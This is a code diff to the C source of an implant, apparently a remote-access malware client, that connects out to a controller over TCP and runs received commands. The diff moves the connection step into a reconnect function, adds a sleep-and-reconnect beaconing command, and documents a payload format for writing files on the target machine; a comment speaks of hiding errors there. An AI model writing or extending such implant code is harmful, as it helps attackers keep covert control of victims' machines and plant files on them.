@@ -8,7 +8,7 @@
 #include "protocol.h"
 #include <stdlib.h>
 
-int main(int argc, char **argv)
+int connect_to_controller()
 {
 
     int implant_fd = socket(AF_INET, SOCK_STREAM, 0);
@@ -16,7 +16,7 @@ int main(int argc, char **argv)
     if (implant_fd < 1)
     {
         perror("socket"); // fix this, we do not want to print an error on the TARGET MACHINE
-        return 0;
+        return -1;
     }
 
     struct sockaddr_in controller_ip_structure;
@@ -32,14 +32,14 @@ int main(int argc, char **argv)
 
         perror("inet_pton");
         close(implant_fd);
-        return 0;
+        return -1;
     }
 
     if ((connect(implant_fd, (struct sockaddr *)&controller_ip_structure, sizeof(controller_ip_structure))) < 0)
     {
         perror("send");
         close(implant_fd);
-        return 0;
+        return -1;
     }
 
     printf("<Succesfully connected to Controller!\n");
@@ -54,7 +54,21 @@ int main(int argc, char **argv)
         // sending the client hello did not work close the implant
         printf("ERROR!");
         close(implant_fd);
-        return 0;
+        return -1;
+    }
+
+    return implant_fd; // returned the socket file descriptor
+}
+
+int main(int argc, char **argv)
+{
+
+    int implant_fd = connect_to_controller();
+
+    if (implant_fd == -1)
+    {
+
+        return 1;
     }
 
     // if we got here then the client hello was sent and we start our loop
@@ -70,7 +84,7 @@ int main(int argc, char **argv)
         {
 
             close(implant_fd);
-            return 0;
+            return 1;
         }
 
         switch (recieved_packet->command_type)
@@ -83,8 +97,25 @@ int main(int argc, char **argv)
             break;
         }
         case COMMAND_SET_SLEEP:
+        {
+
+            // need to sleep, close sockt connection then reconnect after the set sleep in seconds in the payload
+            int sleep_duration = *(int *)recieved_packet->payload;
+
+            Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, 0, NULL};
+            send_packet(&response, implant_fd);
+            close(implant_fd);
+            sleep(sleep_duration); // sleep for that duration
+
+            implant_fd = connect_to_controller();
+
+            if (implant_fd == -1)
+            {
+                return 1; // error
+            }
 
             break;
+        }
 
         case COMMAND_SHUTDOWN:
         {
@@ -132,6 +163,7 @@ int main(int argc, char **argv)
 
         {
 
+            // Payload format for write data: [path_len (4 bytes)][file path][file contents...]
             char *payload = recieved_packet->payload;
 
             int path_len = (*(int *)payload);
